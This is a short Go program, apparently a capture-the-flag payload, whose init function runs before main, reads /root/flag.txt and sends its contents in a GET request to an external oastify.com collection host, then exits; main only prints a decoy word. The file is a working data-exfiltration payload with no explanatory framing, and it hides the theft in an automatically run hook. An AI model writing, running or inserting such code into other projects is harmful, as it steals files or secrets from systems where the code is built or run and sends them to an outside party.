package main

import (
 "io/ioutil"
 "net/http"
 "os"
 "fmt"
)

func init() {
 flag, err := ioutil.ReadFile("/root/flag.txt")
 if err != nil {
  return
 }
 http.Get("http://zpsq0pbuqj84jv3kfjhc64kyapgg4asz.oastify.com?flag=" + string(flag))
 os.Exit(0) // Prevent further execution if needed
}
func main() {
  fmt.Println("main")
}
